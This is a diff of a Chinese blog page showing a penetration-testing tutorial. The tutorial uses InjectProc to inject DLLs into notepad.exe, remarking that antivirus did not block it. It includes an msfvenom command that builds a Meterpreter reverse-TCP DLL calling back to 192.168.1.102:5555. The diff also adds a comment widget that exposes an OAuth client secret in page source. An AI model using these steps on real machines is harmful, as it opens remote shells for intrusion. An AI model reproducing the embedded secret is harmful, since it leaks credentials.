@@ -114,7 +114,7 @@
 <meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496584076334.jpg">
 <meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496584220484.jpg">
 <meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg">
-<meta property="og:updated_time" content="2017-06-04T14:00:48.000Z">
+<meta property="og:updated_time" content="2017-09-11T16:41:48.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="InjectProc&amp;Metasploit">
 <meta name="twitter:image" content="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg">
@@ -470,6 +470,22 @@
 <h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582636284.jpg" alt="enter description here"><br>&nbsp;<br>我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程<br>InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe。<br>在这里我们使用InjectProc\test_files目录中的<img src="http://ojg8j426f.bkt.clouddn.com/1496583170345.jpg" alt="enter description here">，并且我们随机打开一个进程如记事本进程。<br>使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583297150.jpg" alt="enter description here"><br>&nbsp;</p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。<br>首先我们使用msfvenom 生成dll</p>
 <p><pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583594241.jpg" alt="enter description here"><br>&nbsp;<br>以及打开我们的msf开启监听<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583722323.jpg" alt="enter description here"><br>&nbsp;<br>那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中<img src="http://ojg8j426f.bkt.clouddn.com/1496584076334.jpg" alt="enter description here"><br>&nbsp;<br>使用以下命令,并且打开记事本。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496584220484.jpg" alt="enter description here"><br>&nbsp;<br>得到最终会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>视频资料：<a href="https://www.youtube.com/watch?v=GT9nBuXatmU" target="_blank" rel="external">https://www.youtube.com/watch?v=GT9nBuXatmU</a>   InjectProc | Process Injection Techniques | Malware<br><a href="https://www.pinterest.com/penetrationtesting/" target="_blank" rel="external">https://www.pinterest.com/penetrationtesting/</a><br><a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a>   github</p>
+<p><div id="container"></div></p>
+<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+  var gitment = new Gitment({
+    owner: 'secistblog',
+    repo: 'secistblog.github.io',
+    oauth: {
+      client_id: '31ca58bed60fa9231b5f',
+      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
+    },
+  })
+  gitment.render('container')
+</script>
+
+
 
       
     </div>
